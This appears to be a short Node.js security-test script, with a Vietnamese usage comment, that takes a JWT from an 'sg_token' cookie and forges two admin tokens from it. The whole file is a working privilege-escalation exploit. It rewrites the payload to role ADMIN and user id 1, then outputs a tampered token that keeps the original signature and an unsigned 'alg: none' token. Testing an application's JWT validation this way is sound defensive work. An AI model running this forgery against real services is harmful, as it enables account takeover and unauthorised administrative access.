// Dung: node tests/attacks/forge-jwt.mjs <JWT lay tu cookie sg_token>
const [h, p, s] = process.argv[2].split('.');
const payload = JSON.parse(Buffer.from(p, 'base64url').toString());
payload.role = 'ADMIN';
payload.sub = '1';
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
console.log('TAMPERED:', [h, b64(payload), s].join('.'));
console.log('ALG_NONE:', [b64({ alg: 'none', typ: 'JWT' }), b64(payload), ''].join('.'));
